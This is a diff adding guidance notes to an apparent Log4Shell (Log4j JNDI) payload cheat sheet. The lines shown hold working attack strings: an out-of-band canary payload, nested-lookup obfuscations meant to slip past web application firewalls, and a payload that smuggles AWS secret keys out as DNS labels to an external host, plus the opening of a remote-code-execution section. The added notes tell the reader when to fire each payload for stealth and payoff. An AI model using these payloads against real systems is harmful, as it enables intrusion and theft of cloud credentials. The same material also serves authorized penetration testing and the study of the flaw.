@@ -8,6 +8,7 @@ Payloads, protocols, WAF-bypass obfuscation, and `${env}` exfil for the guide. *
 ---
 
 ## 0. The canary (fire this first, DNS-first)
+*What & when:* your very first payload on any Java target — a string whose only job is to make the server phone your listener. Fire the `dns://` variant first (stealthiest, survives egress filters); a ping back = confirmed. Everything below is only worth trying once a canary lands a callback.
 
 ```
 ${jndi:ldap://TOKEN.OOB/a}                 # classic
@@ -34,6 +35,7 @@ INDIRECT:     values stored then logged by a back-office worker · admin panels 
 ---
 
 ## 2. WAF / filter bypass — nested-lookup obfuscation (Log4j resolves nested ${})
+*What & when:* reach for these when the raw `${jndi:` is blocked but you believe the sink is live. Each spells the banned word out of inner lookups Log4j reassembles at runtime, after the WAF already passed it — the block is a spelling filter, not a wall.
 
 ```
 ${${lower:j}ndi:ldap://TOKEN.OOB/a}
@@ -51,6 +53,7 @@ ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://TOKEN.OOB/a}
 ---
 
 ## 3. Secret / env-var exfiltration (data theft WITHOUT RCE — works on 2.15, Guide §11)
+*What & when:* the payoff when RCE is mitigated (2.15/2.16 or egress-blocked) but lookups still resolve. Hiding `${env:SECRET}` inside the hostname makes the secret leave as a DNS label — cloud/DB keys stolen with no code execution. Use this the moment a `dns://` canary lands but the RCE path is closed.
 
 ```
 ${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.OOB/a}
@@ -76,6 +79,7 @@ ${jndi:dns://os-${sys:os.name}.OOB/a}
 ---
 
 ## 5. RCE delivery (AUTHORIZED engagements/labs only — use the established servers, Guide §10)
+*What & when:* only after a callback confirms the sink AND only on an authorized engagement — this is where the server hands back something that runs. Pick the technique by JVM state (A old / C modern-Tomcat / B classpath-gadget). This kit ships detection only; these are the external tools that deliver. One benign `id`, then STOP.
 
 ```
 # technique A (remote codebase, old JVM trustURLCodebase=true):
